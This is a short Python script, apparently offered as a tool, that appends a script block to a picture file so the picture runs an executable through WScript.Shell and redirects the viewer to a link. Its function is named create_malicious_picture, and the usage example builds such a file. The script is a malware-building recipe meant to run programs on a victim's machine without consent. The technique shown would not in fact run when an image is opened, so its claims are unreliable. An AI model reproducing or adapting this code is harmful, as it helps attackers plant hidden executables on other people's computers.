import os

# Create a Windows picture file (.bmp, .jpg, .png, etc.) that executes a file and opens a link
def create_malicious_picture(file_path, link, file_to_run):
    # Check if the file path exists
    if os.path.exists(file_path):
        # Open the picture file in binary mode
        with open(file_path, "ab") as picture_file:
            # Add malicious code to the picture file
            picture_file.write(b"""
            <script>
                var shell = new ActiveXObject("WScript.Shell");
                shell.Run('""" + file_to_run.encode() + b"""');
                window.location.href = '""" + link.encode() + b"""';
            </script>
            """)

# Usage example
create_malicious_picture("malicious_picture.bmp", "https://example.com", "file_to_execute.exe")
